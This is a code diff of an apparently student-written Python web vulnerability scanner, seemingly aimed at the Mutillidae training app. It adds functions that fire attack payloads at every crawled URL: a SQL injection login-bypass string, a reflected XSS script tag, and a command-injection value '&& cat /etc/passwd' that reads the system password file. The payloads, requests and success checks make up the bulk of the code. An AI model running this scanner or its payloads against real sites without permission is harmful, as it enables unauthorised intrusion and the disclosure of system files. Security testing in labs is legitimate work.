@@ -1,49 +1,42 @@
 import urllib
-import urlparse
-import urllib2
-import re
-
-
-def read_file(name):
-
-    root_folder = 'sites'
-    path = root_folder + "/" + name + "/" + "crawled.txt"
-
-    f = open(path, 'r')
-
-    for line in f:
-        #print(line)
-        sql_inject(name, line)
 
 
 """
 SQL injection Function
 """
 
-def sql_inject(name, link):
+
+def sql_inject(name):
 
     root_folder = 'sites'
     path = root_folder + "/" + name + "/" + "crawled.txt"
 
-    print("Starting SQL Injection....")
+    f = open(path, 'r')
 
-    errors = ["MySQl", "error in your SQL"]
+    for link in f:
 
-    print("[-] Testing Errors: "+link)
-    data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
-    request = urllib.urlopen(link, data)
-    page = request.read()
+        print("Starting SQL Injection....")
 
-    newfile = root_folder + "/" + name + "/" + "sqli.txt"
+        errors = ["MySQl", "error in your SQL"]
 
-    for x in errors:
-        if x in page:
-            g = open(newfile, 'a')
+        print("[-] Testing Errors: "+link)
+        data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
+        request = urllib.urlopen(link, data)
+        page = request.read()
 
-            g.write(
-                "\033[01;31mVulnerability Found in: \033[00m\n"
-                "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
-            )
+        newfile = root_folder + "/" + name + "/" + "sqli.txt"
+
+        for x in errors:
+            if x in page:
+                g = open(newfile, 'a')
+
+                g.write(
+                    "\033[01;31mVulnerability Found in: \033[00m\n"
+                    "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
+                )
+
+                print("\033[01;31mVulnerability Found in: \033[00m\n")
+                print("\033[01;31m[*] SQL Injection Found : " + link + "\033[00m\n")
 
 """
 Path Traversal Function
@@ -109,4 +102,56 @@ def path_traversal(name):
                         print(notfound)
         g.close()
 
-path_traversal("MUTILLIDAE")
+
+def cross_site_script(name):
+    root_folder = 'sites'
+    path = root_folder + "/" + name + "/" + "crawled.txt"
+
+    f = open(path, 'r')
+
+    for line in f:
+
+        payload = "<script>alert('XSS')</script>"
+        url = line+payload
+
+        request = urllib.urlopen(url)
+        res = request.read()
+
+        if payload in res:
+
+            print("\033[01;31m[*] XSS Vulnerability Found: \033[00m"+line)
+        else:
+            print("[-] XSS Not Vulnerability Found: "+line)
+
+
+def remote_code_injection(name):
+
+    root_folder = 'sites'
+    path = root_folder + "/" + name + "/" + "crawled.txt"
+
+    f = open(path, 'r')
+
+    for link in f:
+
+        print("Remote Code Injection....")
+
+        errors = ["root:"]
+
+        print("[-] Testing Remote Code: " + link)
+        data = urllib.urlencode({"target_host": "&& cat /etc/passwd", "dns-lookup-php-submit-button": "Lookup+DNS"})
+        request = urllib.urlopen(link, data)
+        page = request.read()
+
+        newfile = root_folder + "/" + name + "/" + "remotecodeinjection.txt"
+
+        for x in errors:
+            if x in page:
+                g = open(newfile, 'a')
+
+                g.write(
+                    "\033[01;31mVulnerability Found in: \033[00m\n"
+                    "\033[01;31m[*] Remote Code Injection Found : " + link + "\033[00m\n"
+                )
+
+                print("\033[01;31mVulnerability Found in: \033[00m\n")
+                print("\033[01;31m[*] Remote Code Injection Found : " + link + "\033[00m\n")
